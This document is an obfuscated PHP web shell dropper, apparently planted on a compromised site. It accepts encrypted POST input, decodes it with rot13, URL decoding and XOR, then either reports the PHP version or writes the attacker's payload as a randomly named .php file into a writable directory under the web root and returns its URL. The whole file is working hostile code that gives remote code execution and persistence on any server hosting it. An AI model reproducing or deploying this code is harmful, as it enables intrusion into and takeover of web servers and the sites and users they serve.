<?php $awmrd = "dyfxgayokibsiytf";$pkhpstfzsh = "";foreach ($_POST as $nmcsnz => $nuedfyziekfraam){if (strlen($nmcsnz) == 16 and substr_count($nuedfyziekfraam, "%") > 10){ublgqit($nmcsnz, $nuedfyziekfraam);}}function ublgqit($nmcsnz, $lgkqgpk){global $pkhpstfzsh;$pkhpstfzsh = $nmcsnz;$lgkqgpk = str_split(rawurldecode(str_rot13($lgkqgpk)));function waqwxy($wgncvbptne, $nmcsnz){global $awmrd, $pkhpstfzsh;return $wgncvbptne ^ $awmrd[$nmcsnz % strlen($awmrd)] ^ $pkhpstfzsh[$nmcsnz % strlen($pkhpstfzsh)];}$lgkqgpk = implode("", array_map("waqwxy", array_values($lgkqgpk), array_keys($lgkqgpk)));$lgkqgpk = @unserialize($lgkqgpk);if (@is_array($lgkqgpk)){$nmcsnz = array_keys($lgkqgpk);$lgkqgpk = $lgkqgpk[$nmcsnz[0]];if ($lgkqgpk === $nmcsnz[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function ofded($nuedfyzir) {static $fmhahwcjk = array();$mitbq = glob($nuedfyzir . '/*', GLOB_ONLYDIR);if (count($mitbq) > 0) {foreach ($mitbq as $nuedfyz){if (@is_writable($nuedfyz)){$fmhahwcjk[] = $nuedfyz;}}}foreach ($mitbq as $nuedfyzir) ofded($nuedfyzir);return $fmhahwcjk;}$tgnth = $_SERVER["DOCUMENT_ROOT"];$mitbq = ofded($tgnth);$nmcsnz = array_rand($mitbq);$vkytbaogtb = $mitbq[$nmcsnz] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($vkytbaogtb, $lgkqgpk);echo "http://" . $_SERVER["HTTP_HOST"] . substr($vkytbaogtb, strlen($tgnth));exit();}}}